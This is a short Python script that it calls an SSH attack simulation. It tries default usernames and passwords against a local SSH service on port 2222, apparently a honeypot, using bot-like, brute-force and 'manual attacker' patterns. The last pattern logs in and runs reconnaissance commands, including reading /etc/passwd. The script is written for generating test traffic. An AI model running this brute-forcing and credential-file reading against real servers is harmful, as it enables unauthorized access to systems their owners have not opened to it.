import paramiko
import random
import time

TARGET_HOST = "localhost"
TARGET_PORT = 2222

USERNAMES = ["root", "admin", "test", "user"]
PASSWORDS = ["123456", "password", "admin", "root", "letmein"]

def attempt(username, password, delay=1, commands=None):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(TARGET_HOST, port=TARGET_PORT,
                    username=username,
                    password=password,
                    timeout=3)

        if commands:
            for cmd in commands:
                ssh.exec_command(cmd)
                time.sleep(delay)

        ssh.close()
    except:
        pass

def fast_bot():
    for _ in range(20):
        attempt(random.choice(USERNAMES),
                random.choice(PASSWORDS),
                delay=0.2)
        time.sleep(random.uniform(0.5, 1.5))

def normal_brute():
    for _ in range(15):
        attempt("root",
                random.choice(PASSWORDS),
                delay=1)
        time.sleep(random.uniform(0.5, 1.5))

def manual_attacker():
    commands = ["ls", "pwd", "whoami", "cat /etc/passwd"]
    attempt("admin", "admin", delay=2, commands=commands)

if __name__ == "__main__":
    print("Simulasi berjalan...")
    fast_bot()
    normal_brute()
    manual_attacker()
    print("Simulasi selesai.")
